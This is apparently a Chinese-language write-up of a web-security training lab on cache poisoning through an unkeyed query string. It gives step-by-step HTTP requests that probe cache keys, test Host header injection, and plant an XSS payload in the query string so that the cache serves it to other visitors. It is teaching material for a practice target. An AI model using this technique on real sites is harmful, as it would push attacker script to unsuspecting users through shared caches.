# 实验室：通过未键控查询字符串进行 Web 缓存投毒

本实验室存在 Web 缓存投毒漏洞，因为查询字符串未被键控。一名用户定期使用 Chrome 访问该网站首页。

要解决本实验室，请投毒首页，使其响应在受害者浏览器中执行 `alert(1)`。

> **提示**
> - 如果遇到困难，你可以使用 `Pragma: x-get-cache-key` 头在响应中显示缓存键。这也适用于其他一些实验室。
> - 尽管你不能使用查询参数作为缓存破坏器，但有一个常见的请求头，如果存在则会被键控。你可以使用 [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) 扩展自动向请求添加缓存破坏头。

## 步骤

探测
- 使用缓存回显头部
    ```http
    GET / HTTP/2
    Host: id.web-security-academy.net
    Pragma: x-get-cache-key
    ```

    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=35
        Age: 22
        X-Cache-Key: /$$
        X-Cache: hit
        Content-Length: 8375

        <link rel="canonical" href='//id.web-security-academy.net/'/>
        ```
        - 之后测试 Host 头注入

测试 Host 头注入
- 请求
    ```http
    GET /?x HTTP/2
    Host: id.web-security-academy.net:foo@x
    Pragma: x-get-cache-key
    ```

- 响应
    ```html
    <link rel="canonical" href='//id.web-security-academy.net/?x'/>
    ```

- 并非 Host 注入，而是 URL 反射

测试 XSS
- 请求
    ```http
    GET /?'><svg/onload='alert(1) HTTP/2
    Host: id.web-security-academy.net
    Pragma: x-get-cache-key
    ```

- 响应
    ```http
    HTTP/2 200 OK
    X-Cache-Key: /$$
    X-Cache: miss

    <link rel="canonical" href='//id.web-security-academy.net/?'>
    <svg/onload='alert(1)'/>
    ```
    - 此处查询参数不被视为缓存键，于是查询参数中的 XSS 将被缓存并分发

- 恰好通关

示例解决方案使用 `Origin` 头作为缓存破坏器
